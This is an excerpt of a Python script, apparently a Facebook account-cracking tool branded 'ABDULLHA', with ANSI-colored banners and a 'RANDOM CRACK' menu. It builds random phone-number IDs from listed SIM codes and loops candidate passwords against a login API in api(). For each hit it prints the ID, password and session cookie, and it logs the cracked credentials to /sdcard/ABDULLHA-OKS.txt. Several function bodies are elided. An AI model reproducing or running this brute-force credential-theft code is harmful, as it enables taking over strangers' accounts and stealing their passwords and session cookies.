...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mABDULLHA ]\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • ABDULLHA360       ║  \033[1;97m  
╠══[Github                   • \33[1;38mABDULLHA-404 ║\33[1;34m   
╠══[Whatsapp                 • 01*********    ║\33[1;35m 
╠══[TOOLS                    • FREE ]         ║ \33[1;32m   
╠══[VERSION                  • 1.7 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m
""")
def linex():
...
def main():
    ...
    print(f'\x1b[38;5;155m➤  [1] RANDOM CRACK MADA')
...
def bhoot():
    ...
    os.system("clear")
    print(logo)
    print(f'\x1b[38;5;155m[✧] SIM CODE : 032,033,034')
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] ABDULLHA~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[ABDULLHA-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/ABDULLHA-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
